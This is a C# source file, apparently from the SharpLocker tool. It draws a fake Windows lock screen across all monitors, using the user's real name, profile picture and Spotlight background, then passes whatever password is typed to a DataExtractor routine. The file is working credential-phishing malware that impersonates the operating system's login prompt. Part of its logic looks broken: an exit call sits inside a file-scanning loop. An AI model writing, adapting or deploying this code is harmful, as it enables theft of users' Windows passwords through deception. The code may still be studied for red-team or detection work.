using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;


namespace SharpLocker
{
    public partial class LockScreenForm : Form
    {
        [DllImport("shell32.dll", EntryPoint = "#261",
        CharSet = CharSet.Unicode, PreserveSig = false)]
        public static extern void GetUserTilePath(
        string username,
        uint whatever, // 0x80000000
        StringBuilder picpath, int maxLength);

        public static string GetUserTilePath(string username)
        {   // username: use null for current user
            var sb = new StringBuilder(1000);
            GetUserTilePath(username, 0x80000000, sb, sb.Capacity);
            return sb.ToString();
        }

        public static Image GetUserTile(string username)
        {
            return Image.FromFile(GetUserTilePath(username));
        }

        public LockScreenForm()
        {
            InitializeComponent();
            Taskbar.Hide();

            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Normal;
            StartPosition = FormStartPosition.Manual;
            Location = new Point(0, 0);
            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            //Creds to keldnorman
            //https://github.com/Pickfordmatt/SharpLocker/issues/2
            Image myimage = new Bitmap(getSpotlightImage());
            BackgroundImage = myimage;

            BackgroundImageLayout = ImageLayout.Stretch;

            this.TopMost = true;
            string userName = System.DirectoryServices.AccountManagement.UserPrincipal.Current.DisplayName;
            UserNameLabel.Text = userName;
            UserNameLabel.BackColor = System.Drawing.Color.Transparent;

            int percentHeight = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100);
            int middleWidth = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Width) / 2);
            int tbsize = 28;
            int tbwidth = 200;

            ProfileIcon.Top = percentHeight * 27;
            ProfileIcon.Left = middleWidth - 100;

            UserNameLabel.Top = percentHeight * 51;
            UserNameLabel.Left = middleWidth - 201;

            SubmitPasswordButton.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
            SubmitPasswordButton.Left = middleWidth + (tbwidth / 2) - 11;

            show.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
            show.Left = middleWidth + (tbwidth / 2) - 45;

            PasswordTextBox.Top = Convert.ToInt32(percentHeight * 59.4);
            PasswordTextBox.Size = new System.Drawing.Size(tbwidth - 4, Convert.ToInt32(tbsize));
            PasswordTextBox.Left = middleWidth - (tbwidth / 2) - 12;

            textboxBackground.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
            textboxBackground.Left = Convert.ToInt32(middleWidth - (tbwidth / 2) - (tbsize * 0.125) - 12);
            textboxBackground.Size = new System.Drawing.Size(Convert.ToInt32(tbwidth + (tbsize * 0.25)), Convert.ToInt32(tbsize * 1.25));

            power.Left = Screen.PrimaryScreen.Bounds.Width - 60;
            power.Top = Screen.PrimaryScreen.Bounds.Height - 60;

            accessibility.Left = Screen.PrimaryScreen.Bounds.Width - 110;
            accessibility.Top = Screen.PrimaryScreen.Bounds.Height - 60;

            language.Left = Screen.PrimaryScreen.Bounds.Width - 160;
            language.Top = Screen.PrimaryScreen.Bounds.Height - 60;

            if (!PasswordTextBox.Focus())
            {
                PasswordTextBox.Focus();
            }

            ActiveControl = PasswordTextBox;

            if (CanFocus)
            {
                Focus();
            }

            //Get the username. This returns Domain\Username
            string userNameText = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

            //https://stackoverflow.com/questions/7731855/rounded-edges-in-picturebox-c-sharp
            System.Drawing.Drawing2D.GraphicsPath gp = new System.Drawing.Drawing2D.GraphicsPath();
            gp.AddEllipse(0, 0, ProfileIcon.Width - 3, ProfileIcon.Height - 3);
            Region rg = new Region(gp);
            ProfileIcon.Region = rg;
            ProfileIcon.Image = Image.FromFile(GetUserTilePath(userNameText.Split('\\')[1]));


            foreach (var screen in Screen.AllScreens)
            {

                Thread thread = new Thread(() => WorkThreadFunction(screen));
                thread.Start();
            }


        }

        public void WorkThreadFunction(Screen screen)
        {
            try
            {
                if (screen.Primary == true)
                {


                }

                if (screen.Primary == false)
                {
                    int mostLeft = screen.WorkingArea.Left;
                    int mostTop = screen.WorkingArea.Top;
                    Debug.WriteLine(mostLeft.ToString(), mostTop.ToString());
                    using (Form form = new Form())
                    {
                        form.WindowState = FormWindowState.Normal;
                        form.StartPosition = FormStartPosition.Manual;
                        form.Location = new Point(mostLeft, mostTop);
                        form.FormBorderStyle = FormBorderStyle.None;
                        form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
                        form.BackColor = Color.Black;
                        form.ShowDialog();
                    }
                }
            }
            catch { }
        }
        public string getSpotlightImage()
        {
            //Get Windows Spotlight Images Location Path. (C:\Users\[Username]\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\)
            string spotlight_dir_path = @Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\");

            /* Save the name of the larger image from spotlight dir.
             * Normally the larger image present in this directory is the current lock screen image. */
            string img_name = "";
            DirectoryInfo folderInfo = new DirectoryInfo(spotlight_dir_path);
            long largestSize = 0;
            foreach (var fi in folderInfo.GetFiles())
            {
                // log errors
                Taskbar.Show();
                Application.Exit();

                if (fi.Length > largestSize)
                {
                    largestSize = fi.Length;
                    img_name = fi.Name;
                }
            }
            //Save image full path
            string img_path = Path.Combine(spotlight_dir_path, img_name);
            return img_path;
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;  // Turn off WS_CLIPCHILDREN
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            base.OnClosing(e);
        }

        private void show_MouseDown(object sender, MouseEventArgs e)
        {
            PasswordTextBox.UseSystemPasswordChar = false;
        }

        private void show_MouseUp(object sender, MouseEventArgs e)
        {
            PasswordTextBox.UseSystemPasswordChar = true;
        }

        private void SubmitButton_Click_1(object sender, EventArgs e)
        {
            DataExtractor.Extract(PasswordTextBox.Text);

            Taskbar.Show();
            Application.Exit();
        }
    }
}
